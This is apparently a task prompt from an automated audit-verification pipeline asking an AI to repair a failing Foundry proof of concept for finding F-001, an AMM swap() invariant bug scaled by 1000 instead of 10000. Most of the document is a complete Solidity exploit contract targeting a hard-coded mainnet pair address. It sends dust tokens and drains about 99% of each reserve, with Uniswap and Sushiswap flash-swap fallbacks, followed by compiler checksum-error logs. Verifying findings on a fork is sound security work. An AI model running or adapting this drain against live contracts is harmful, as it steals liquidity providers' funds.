You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Swap invariant uses a 10,000-based fee adjustment against a 1,000-based RHS, allowing near-total reserve drainage
- claim: `swap()` computes adjusted balances on a 10,000 scale (`balance*10000 - amountIn*15`) but compares them to `reserve0 * reserve1 * 1000**2` instead of `10000**2`. This weakens the constant-product check by 100x, so traders only need to preserve about 1% of the intended invariant.
- impact: An attacker can drain roughly 99% of either reserve with only a dust-sized counter-input, causing catastrophic LP loss.
- exploit_paths: ["Send a minimal amount of `token0` to the pair, then call `swap(0, reserve1 - reserve1/100, attacker, \"\")`; the weakened K-check still passes.", "Symmetrically, send a minimal amount of `token1`, then call `swap(reserve0 - reserve0/100, 0, attacker, \"\")`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface INimbusPairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xc0a6b8c534fad86df8fa1abb17084a70f86eddc1;

    address internal constant UNISWAP_V2_FACTORY = 0x5c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f;
    address internal constant SUSHISWAP_FACTORY = 0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac;

    address internal constant WETH = 0xc02aa39b223fe8d0a0e5c4f27ead9083c756cc2;
    address internal constant USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
    address internal constant USDT = 0xdac17f958d2ee523a2206206994597c13d831ec7;
    address internal constant DAI = 0x6b175474e89094c44da98b954eedeac495271d0f;

    uint256 internal constant DUST = 1;
    uint256 internal constant RESERVE_DIVISOR = 100;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        INimbusPairLike target = INimbusPairLike(TARGET);
        address token0 = target.token0();
        address token1 = target.token1();

        uint256 baseline0 = IERC20Minimal(token0).balanceOf(address(this));
        uint256 baseline1 = IERC20Minimal(token1).balanceOf(address(this));

        if (baseline0 >= DUST) {
            try this.executeSequence(uint8(1), token0, token1) returns (bool ok) {
                if (ok) {
                    _captureProfit(token0, token1, baseline0, baseline1);
                    if (_profitAmount > 0) {
                        return;
                    }
                }
            } catch {}
        }

        if (baseline1 >= DUST) {
            try this.executeSequence(uint8(2), token0, token1) returns (bool ok) {
                if (ok) {
                    _captureProfit(token0, token1, baseline0, baseline1);
                    if (_profitAmount > 0) {
                        return;
                    }
                }
            } catch {}
        }

        address auxPairForToken0 = _findAuxPair(token0, token1);
        if (auxPairForToken0 != address(0)) {
            try IUniswapV2PairLike(auxPairForToken0).swap(
                _auxAmountOut0(auxPairForToken0, token0),
                _auxAmountOut1(auxPairForToken0, token0),
                address(this),
                abi.encode(uint8(1), auxPairForToken0, token0, token1)
            ) {
                _captureProfit(token0, token1, baseline0, baseline1);
                if (_profitAmount > 0) {
                    return;
                }
            } catch {}
        }

        address auxPairForToken1 = _findAuxPair(token1, token0);
        if (auxPairForToken1 != address(0)) {
            try IUniswapV2PairLike(auxPairForToken1).swap(
                _auxAmountOut0(auxPairForToken1, token1),
                _auxAmountOut1(auxPairForToken1, token1),
                address(this),
                abi.encode(uint8(2), auxPairForToken1, token0, token1)
            ) {
                _captureProfit(token0, token1, baseline0, baseline1);
                if (_profitAmount > 0) {
                    return;
                }
            } catch {}
        }
    }

    function executeSequence(uint8 mode, address token0, address token1) external returns (bool) {
        require(msg.sender == address(this), "self-only");

        if (mode == 1) {
            return _runPathToken0ToDrainToken1(token0);
        }
        if (mode == 2) {
            return _runPathToken1ToDrainToken0(token1);
        }

        revert("bad-mode");
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (uint8 mode, address expectedPair, address token0, address token1) =
            abi.decode(data, (uint8, address, address, address));
        require(msg.sender == expectedPair, "unexpected-pair");

        address borrowedToken = amount0 > 0 ? IUniswapV2PairLike(msg.sender).token0() : IUniswapV2PairLike(msg.sender).token1();
        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount >= DUST, "insufficient-borrow");

        if (mode == 1) {
            require(borrowedToken == token0, "wrong-token0-borrow");
            require(_runPathToken0ToDrainToken1(token0), "path1-failed");

            // Direct execution follows the listed exploit path first:
            // send minimal token0 and drain ~99% of token1.
            // If we had to source that 1 wei via a public V2 flash swap, we still need to
            // settle the same-token debt before the callback returns. The mirrored listed
            // exploit path is reused only as the realistic on-chain repayment step.
            require(_runPathToken1ToDrainToken0(token1), "repay-path-failed");
        } else if (mode == 2) {
            require(borrowedToken == token1, "wrong-token1-borrow");
            require(_runPathToken1ToDrainToken0(token1), "path2-failed");

            // Mirrored repayment step for token1-funded execution.
            require(_runPathToken0ToDrainToken1(token0), "repay-path-failed");
        } else {
            revert("bad-mode");
        }

        uint256 repayAmount = _sameTokenFlashRepayment(borrowedAmount);
        require(_safeTransfer(borrowedToken, msg.sender, repayAmount), "repay-failed");
    }

    function _runPathToken0ToDrainToken1(address token0) internal returns (bool) {
        INimbusPairLike target = INimbusPairLike(TARGET);

        (, uint112 reserve1Before,) = target.getReserves();
        if (reserve1Before <= 1) {
            return false;
        }

        uint256 amount1Out = uint256(reserve1Before) - (uint256(reserve1Before) / RESERVE_DIVISOR);
        if (amount1Out == 0 || amount1Out >= reserve1Before) {
            return false;
        }

        if (!_safeTransfer(token0, TARGET, DUST)) {
            return false;
        }

        try target.swap(0, amount1Out, address(this), "") {
            return true;
        } catch {
            return false;
        }
    }

    function _runPathToken1ToDrainToken0(address token1) internal returns (bool) {
        INimbusPairLike target = INimbusPairLike(TARGET);

        (uint112 reserve0Before,,) = target.getReserves();
        if (reserve0Before <= 1) {
            return false;
        }

        uint256 amount0Out = uint256(reserve0Before) - (uint256(reserve0Before) / RESERVE_DIVISOR);
        if (amount0Out == 0 || amount0Out >= reserve0Before) {
            return false;
        }

        if (!_safeTransfer(token1, TARGET, DUST)) {
            return false;
        }

        try target.swap(amount0Out, 0, address(this), "") {
            return true;
        } catch {
            return false;
        }
    }

    function _findAuxPair(address borrowToken, address otherTargetToken) internal view returns (address) {
        address[5] memory quoteCandidates = [otherTargetToken, WETH, USDC, USDT, DAI];
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 factoryIndex = 0; factoryIndex < factories.length; ++factoryIndex) {
            for (uint256 quoteIndex = 0; quoteIndex < quoteCandidates.length; ++quoteIndex) {
                address quoteToken = quoteCandidates[quoteIndex];
                if (quoteToken == address(0) || quoteToken == borrowToken) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[factoryIndex]).getPair(borrowToken, quoteToken);
                if (pair == address(0) || pair == TARGET) {
                    continue;
                }

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    continue;
                }

                if (IUniswapV2PairLike(pair).token0() == borrowToken) {
                    if (reserve0 > DUST) {
                        return pair;
                    }
                } else if (IUniswapV2PairLike(pair).token1() == borrowToken) {
                    if (reserve1 > DUST) {
                        return pair;
                    }
                }
            }
        }

        return address(0);
    }

    function _auxAmountOut0(address pair, address borrowToken) internal view returns (uint256) {
        return IUniswapV2PairLike(pair).token0() == borrowToken ? DUST : 0;
    }

    function _auxAmountOut1(address pair, address borrowToken) internal view returns (uint256) {
        return IUniswapV2PairLike(pair).token1() == borrowToken ? DUST : 0;
    }

    function _sameTokenFlashRepayment(uint256 borrowedAmount) internal pure returns (uint256) {
        return ((borrowedAmount * 1000) / 997) + 1;
    }

    function _captureProfit(address token0, address token1, uint256 baseline0, uint256 baseline1) internal {
        uint256 current0 = IERC20Minimal(token0).balanceOf(address(this));
        uint256 current1 = IERC20Minimal(token1).balanceOf(address(this));

        uint256 gain0 = current0 > baseline0 ? current0 - baseline0 : 0;
        uint256 gain1 = current1 > baseline1 ? current1 - baseline1 : 0;

        if (gain0 >= gain1 && gain0 > 0) {
            _profitToken = token0;
            _profitAmount = gain0;
        } else if (gain1 > 0) {
            _profitToken = token1;
            _profitAmount = gain1;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:28:40:
   |
28 |     address internal constant TARGET = 0xc0a6b8c534fad86df8fa1abb17084a70f86eddc1;
   |                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:30:52:
   |
30 |     address internal constant UNISWAP_V2_FACTORY = 0x5c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f;
   |                                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:31:51:
   |
31 |     address internal constant SUSHISWAP_FACTORY = 0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac;
   |                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but is not exactly 40 hex digits. It is 39 hex digits. If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:33:38:
   |
33 |     address internal constant WETH = 0xc02aa39b223fe8d0a0e5c4f27ead9083c756cc2;
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:34:38:
   |
34 |     address internal constant USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xdAC17F958D2ee523a2206206994597C13D831ec7". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xdAC17F958D2ee523a2206206994597C13D831ec7". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:35:38:
   |
35 |     address internal constant USDT = 0xdac17f958d2ee523a2206206994597c13d831ec7;
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x6B175474E89094C44Da98b954EedeAC495271d0F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x6B175474E89094C44Da98b954EedeAC495271d0F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:36:37:
   |
36 |     address internal constant DAI = 0x6b175474e89094c44da98b954eedeac495271d0f;
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
